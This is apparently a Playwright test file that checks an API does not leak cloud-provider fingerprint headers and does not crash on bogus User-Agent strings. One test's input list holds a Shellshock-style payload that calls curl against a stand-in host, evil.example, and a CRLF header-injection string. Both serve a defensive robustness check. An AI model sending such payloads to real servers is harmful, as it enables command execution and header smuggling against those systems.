import { test, expect } from '@playwright/test';
import { API_BASE } from './helpers/api';

/**
 * Cloud SDK headers — pass 15. Defensive header surface on incoming
 * requests:
 *  - the API should NOT echo back a `Server` header that names a
 *    cloud SDK (e.g. "AWS Lambda/...") since that aids attackers in
 *    targeting CVEs to runtime
 *  - the response should NOT carry `X-Cloud-Provider` or similar
 *    cloud-fingerprint headers
 *  - User-Agent allowlist on the API: requests with obviously bogus
 *    UA strings (empty, very long, suspicious prefixes) still respond
 *    < 500 — the UA filter is whitelist-driven, never crash-driven
 */

const FORBIDDEN_RESPONSE_HEADERS = [
    'x-aws-request-id',
    'x-gcp-request-id',
    'x-azure-request-id',
    'x-cloud-provider',
    'x-lambda-runtime-version',
];

test.describe('Cloud SDK headers — response should not leak provider fingerprint', () => {
    test('/api/health response does not carry cloud-fingerprint headers', async ({ request }) => {
        const res = await request.get(`${API_BASE}/api/health`);
        for (const h of FORBIDDEN_RESPONSE_HEADERS) {
            const v = res.headers()[h];
            expect(v, `/api/health leaked cloud header "${h}": ${v}`).toBeUndefined();
        }
    });

    test('Server header on /api/health is anonymous or absent (no SDK version leak)', async ({
        request,
    }) => {
        const res = await request.get(`${API_BASE}/api/health`);
        const server = res.headers()['server'] || '';
        const sdkLeak = /(lambda|fargate|cloudfunctions|cloud-run|appengine|azurewebsites)/i.test(
            server,
        );
        expect(sdkLeak, `Server header leaked cloud SDK: "${server}"`).toBe(false);
    });

    test('API survives bogus User-Agent strings without 5xx', async ({ request }) => {
        const bogusUAs = [
            '',
            'A'.repeat(2048),
            'Mozilla/5.0 () { :; }; curl http://evil.example',
            '\x00\x01\x02',
            'curl/7.0\r\nX-Injected: 1',
        ];
        for (const ua of bogusUAs) {
            const res = await request.get(`${API_BASE}/api/health`, {
                headers: { 'User-Agent': ua },
            });
            // Either rejected (4xx) or accepted (2xx). Never crash (5xx).
            expect(
                res.status(),
                `bogus UA ${JSON.stringify(ua.slice(0, 30))} → ${res.status()}`,
            ).toBeLessThan(500);
        }
    });
});
